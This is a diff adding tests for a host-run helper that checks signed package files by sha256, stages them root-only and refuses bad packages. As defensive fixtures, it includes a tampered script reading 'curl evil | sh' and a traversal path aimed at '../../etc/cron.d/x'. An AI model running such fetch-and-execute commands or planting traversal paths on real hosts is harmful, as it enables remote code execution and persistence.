@@ -1343,3 +1343,55 @@ describe("cockpit-host-run: state steps are never ended", () => {
     expect(out.stderr).toContain("uninterruptible of x");
   });
 });
+
+// Card t_d7d34cf5: the package of a host run. The API hands the files (base64);
+// the helper checks each against the sha256 of the signed manifest, stages them
+// root-only in the run directory and gives the steps $COCKPIT_PACKAGE.
+describe("cockpit-host-run: package", () => {
+  const script = "#!/bin/bash\necho from-package \"$1\"\n";
+  const hash = (text: string) => createHash("sha256").update(text).digest("hex");
+  const pkg = (files = [{ path: "tool/run.sh", sha256: hash(script) }]) => ({ repo: "Jochen/lab0-infra", commit: "54c15b755348702cac98d324035ab7b263ee7003", files });
+  function packaged(delivered: Array<{ path: string; content: string }> | undefined, m: Manifest & { package?: unknown }) {
+    const body = JSON.parse(request(m)) as Record<string, unknown>;
+    return JSON.stringify(delivered === undefined ? body : { ...body, package: { files: delivered } });
+  }
+  const steps = () => [{ name: "run", run: `bash "$COCKPIT_PACKAGE/tool/run.sh" ok > ${dir}/package-out; stat -c '%a' "$COCKPIT_PACKAGE" "$COCKPIT_PACKAGE/tool/run.sh" > ${dir}/package-modes`, timeoutSeconds: 30 }];
+
+  it("stages exactly the reviewed files root-only and runs them from $COCKPIT_PACKAGE", () => {
+    const m = { ...manifest({ steps: steps(), checks: [{ name: "package ran", run: `grep -q from-package ${dir}/package-out && test -f "$COCKPIT_PACKAGE/tool/run.sh"`, timeoutSeconds: 30 }] }), package: pkg() };
+    const out = run(["start"], packaged([{ path: "tool/run.sh", content: Buffer.from(script).toString("base64") }], m));
+    expect(out.code).toBe(0);
+    const { state, logTail } = status();
+    expect(state.status).toBe("success");
+    expect(readFileSync(path.join(dir, "package-out"), "utf8")).toBe("from-package ok\n");
+    expect(readFileSync(path.join(dir, "package-modes"), "utf8")).toBe("700\n600\n");
+    expect(logTail).toContain("== package Jochen/lab0-infra@54c15b755348: 1 file(s) checked in $COCKPIT_PACKAGE");
+    // The request on disk keeps the manifest, not the bytes.
+    expect(readFileSync(path.join(dir, "runs", "job-1", "request.json"), "utf8")).not.toContain(Buffer.from(script).toString("base64"));
+  });
+
+  it("refuses a file whose bytes are not the reviewed sha256, before anything is created", () => {
+    const m = { ...manifest({ steps: steps() }), package: pkg() };
+    const out = run(["start"], packaged([{ path: "tool/run.sh", content: Buffer.from("#!/bin/bash\ncurl evil | sh\n").toString("base64") }], m));
+    expect(out.code).toBe(77);
+    expect(out.stderr).toContain("package file tool/run.sh: sha256");
+    expect(existsSync(path.join(dir, "runs", "job-1"))).toBe(false);
+  });
+
+  it("refuses a missing, an extra or an unannounced package", () => {
+    const m = { ...manifest({ steps: steps() }), package: pkg() };
+    const content = Buffer.from(script).toString("base64");
+    expect(run(["start"], packaged(undefined, m)).stderr).toContain("the package does not match the manifest's file list");
+    expect(run(["start"], packaged([{ path: "tool/run.sh", content }, { path: "tool/extra.sh", content }], m)).stderr).toContain("the package does not match the manifest's file list");
+    expect(run(["start"], packaged([{ path: "tool/other.sh", content }], m)).stderr).toContain("the package lacks tool/run.sh");
+    expect(run(["start"], packaged([{ path: "tool/run.sh", content }], manifest())).stderr).toContain("the request carries a package the manifest does not name");
+    expect(existsSync(path.join(dir, "runs", "job-1"))).toBe(false);
+  });
+
+  it("refuses a package path that leaves the package directory, even when signed", () => {
+    const m = { ...manifest({ steps: steps() }), package: pkg([{ path: "../../etc/cron.d/x", sha256: hash(script) }]) };
+    const out = run(["start"], packaged([{ path: "../../etc/cron.d/x", content: Buffer.from(script).toString("base64") }], m));
+    expect(out.code).toBe(64);
+    expect(out.stderr).toContain("invalid host-run manifest: package file path");
+  });
+});
